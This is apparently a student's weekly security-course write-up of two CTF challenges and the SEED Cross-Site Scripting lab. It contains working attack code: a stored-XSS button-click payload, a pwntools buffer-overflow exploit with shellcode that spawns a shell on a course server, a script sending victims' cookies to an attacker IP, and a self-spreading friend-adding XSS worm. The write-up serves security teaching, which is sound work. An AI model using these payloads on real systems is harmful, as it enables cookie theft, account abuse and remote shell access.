# Work performed - Week #10

# CTF

The goal of the week 8 and 9 CTFs is to exploit Cross-site scripting (XSS) vulnerabilities and PWN.

# Week 10 - Challenge 1

The first challenge has to do with XSS vulnerabilities, and the goal is for the administrator to "gives us access" to the flag. Here, the XSS vulnerability is in the input form presented in the following picture:

<figure align="center">
  <img src="images/week10/fig1.png"/>
  <figcaption>Figure 1. Initial Form.</figcaption>
</figure>

This means we can inject any JavaScript that will later be executed. Here we have an example of a **Stored Cross-Site Scripting** vulnerability that allows an attacker to inject a malicious script persistently into the web application.
When starting to understand the way the web application worked, we noticed that after submitting a request, we were presented two buttons: "Give the flag" and "Mark request as read", as seen in the following image:

<figure align="center">
  <img src="images/week10/fig2.png"/>
  <figcaption>Figure 2. Request submission view.</figcaption>
</figure>

Our idea here was to inject code that would allow us to see the flag. So, as we knew that the administrator would eventually answer our request, we injected code that made the administrator click the "Give the flag" button when checking the request. That code was:

```javascript
<script type="text/javascript">
	document.getElementById("giveflag").click()
</script>
```

As a result, after a while, we got our flag!

<figure align="center">
  <img src="images/week10/fig3.png"/>
  <figcaption>Figure 3. Challenge 1 flag.</figcaption>
</figure>

# Week 10 - Challenge 2

For the second challenge, we had a PWN exercise. The goal was to perform a buffer overflow that would allow us to call a shell.
First of all, as recommended, we started by running the `checksec` command on the binary to get its characteristics.

<figure align="center">
  <img src="images/week10/fig4.png"/>
  <figcaption>Figure 4. Checksum's result.</figcaption>
</figure>

From the output, we noticed that the stack had executing permissions, there were no canary protections in the stack, and very importantly, the "PIE enabled" indicates that the address randomization is turned, which means the addresses are constantly changing. Nevertheless, we can get around that problem because the `main.c` script prints the `buffer` variable address. Using a python script, we can parse that value and make the necessary calculations to redirect the `return address` register to our shellcode. For that, we need to make sure we know the offset to the `return address`, so using `gdb`, we typed the following commands:

-   `b main` - To set a breakpoint for the main function.
-   `run` - To start running the script.
-   `next` - To go through the program's instructions.
-   `p &buffer` - To print the buffer's address that we will further use for calculations, as mentioned.
-   `x/50x &buffer` - To print the next 200 bytes from the buffer's address.

In the following image, we present the output of the last command, which outputs what is in memory from the buffer's address.

<figure align="center">
  <img src="images/week10/fig5.png"/>
  <figcaption>Figure 5. Last gdb command result.</figcaption>
</figure>

The white area has to do with the 100 bytes buffer. The following 4 bytes are probably padding, and the 4 bytes after those are from the `old ebp`, which is zero, but it is considered undefined as it points to the previous stack frame of the calling function. Because the main function does not have a calling function, it is considered an undefined value. Finally, the next 4 bytes are from the `return address` and the ones we want to overwrite. So, in total, our offset from the buffer's address is 100 bytes + 4 bytes of padding + 4 bytes of the `old ebp` = 108 bytes.

Our buffer overflow will then have 108 bytes of "garbage", 4 bytes of the new `return address` value which will be a value greater than `&buffer` + 112 bytes (in the code we will present next, this value is `&buffer + 124`) and will direct to the `NOPs` (0x90) before the shellcode or the beginning of the shellcode itself. Finally, the shellcode itself is made for 32 bits machines.

The developed exploit was the following:

```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")

    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4001)

shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')


p.recvuntil(b" is ")

buffer_add_str = p.recvuntil(b".").decode()[:-1]

print(buffer_add_str)
buffer_add = int(buffer_add_str, base=16)

attack = bytearray(0x90 for i in range(200))

attack[(200 - len(shellcode)):] = shellcode

attack[108:112] = p32(buffer_add + 124)
print(attack)

p.recvuntil(b":\n")
p.sendline(attack)

p.interactive()
```

Here we opted to inject 200 bytes. Executing this script against the remote server would give us the desired flag.

<figure align="center">
  <img src="images/week10/fig6.png"/>
  <figcaption>Figure 6. Exploit execution.</figcaption>
</figure>

# SEED Lab Tasks

This week's suggested lab was [Cross-Site Scripting (XSS) Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/), from SEED labs. Cross-site scripting is a vulnerability that allows attackers to inject malicious code (e.g., JavaScript programs) into victims' web browsers. Using this malicious code, attackers can steal a victim’s credentials, such as session cookies. The access control policies (i.e., the same-origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities.

## Task 1

In this task, we have to inject the following JavaScript code into our Elgg profile:

```javascript
alert("XSS");
```

This code should be executed whenever someone views our profile. To achieve this goal, we can update our "brief description" field as follows:

<figure align="center">
  <img src="images/week10/fig7.png"/>
  <figcaption>Figure 7. XSS injection.</figcaption>
</figure>

Every time someone views our profile, the following popup will show up:

<figure align="center">
  <img src="images/week10/fig8.png"/>
  <figcaption>Figure 8. Injected JavaScript execution.</figcaption>
</figure>

## Task 2

This task also aims to inject Javascript code that will be executed whenever someone views our profile. However, we want to display the user's cookies in the alert window this time.

To accomplish this, we can update the "brief description" section, as the previous task:

<figure align="center">
  <img src="images/week10/fig9.png"/>
  <figcaption>Figure 9. XSS injection.</figcaption>
</figure>

Every time someone views our profile, the injected Javascript code will be executed, and the following window will show up:

<figure align="center">
  <img src="images/week10/fig10.png"/>
  <figcaption>Figure 10. Injected JavaScript execution.</figcaption>
</figure>

## Task 3

As in the previous task, only users could see their own browser's cookies. In this task, we, as an attacker, want the cookies to be sent to our machine.

As proposed, we can do this by injecting an HTML tag that will perform a request. In this case, the `<img>` tag can be used since the URL in the `src` field is used to perform an HTTP GET request. So we can write the attacker machine's address with a specific port that the attacker can be listening to. This way, while listening to that port using, for example, `netcat`, the attacker can see requests sent from the users' browser, with their cookies as parameters in the URL.

```html
<script>
	document.write(
		"<img src=http://10.9.0.1:5555?c=" + escape(document.cookie) + " >"
	);
</script>
```

<figure align="center">
  <img src="images/week10/fig11.png"/>
  <figcaption>Figure 11. Script injection in user profile.</figcaption>
</figure>

<figure align="center">
  <img src="images/week10/fig12.png"/>
  <figcaption>Figure 12. Request received in attacker's machine.</figcaption>
</figure>

As shown in figure X, the attacker can see that a GET request was received, and, next to `/?c=`, they can see the user's cookies.

## Task 4

In this last task, we want to write an XSS worm that automatically adds user "Samy" as a friend to any user that visits his page.

We can do something similar to the other tasks and embed a JavaScript program in Samy's profile. However, this code must make any user who visits the page send the appropriate request to add Samy as a friend.

In order to find how to write this request, we can, while logged in as Samy, inspect the "Add Friend" button on another user's page:

<figure align="center">
  <img src="images/week10/fig13.png"/>
  <figcaption>Figure 13. "Add friend" button inspection.</figcaption>
</figure>

By inspecting the button element, we can see that a request is sent to the URL `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1641939671&__elgg_token=OvXl8SQ39WUqvGa_Auct7A`, with the `friend` parameter being the ID of the user to be added and the following parameters being tokens for user authentication.

We could find Samy's ID by inspecting the "Members" page. In the member list of this page, the list elements contained the IDs of every member in the list, including Samy, which was 59.

<figure align="center">
  <img src="images/week10/fig14.png"/>
  <figcaption>Figure 14. Members list inspection with Samy's ID.</figcaption>
</figure>

With this information, we can create a request that will add Samy as a friend when executed in a script on other users' browsers. This request has the following URL:
`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=user_ts&__elgg_token=user_token`, with the fields `__elgg_ts` and `__elgg_token` being generated in the script, according to the user's current token.

So the final script should be the following:

```javascript
window.onload = function () {
	var Ajax = null;
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

	var sendurl =
		"http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

	Ajax = new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
};
```

We can then insert the code on a `<script>` tag and write it in the "About me" field of Samy's profile page, having clicked on "Edit HTML" beforehand:

<figure align="center">
  <img src="images/week10/fig15.png"/>
  <figcaption>Figure 15. Embedded JavaScript for attack.</figcaption>
</figure>

Furthermore, now every user who visits Samy's profile page will have the script running in their machine and send a request automatically adding Samy as their friend.

Regarding the last questions:

-   Explain the purpose of Lines 1 and 2, why are they are needed?
    As part of the HTTP request to send to the server, we need lines 1 and 2 to correctly identify the person who's adding Samy.

-   If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
    The Editor mode adds extra HTML code to the text typed into the field which makes it not executable. So the attack will not launch.
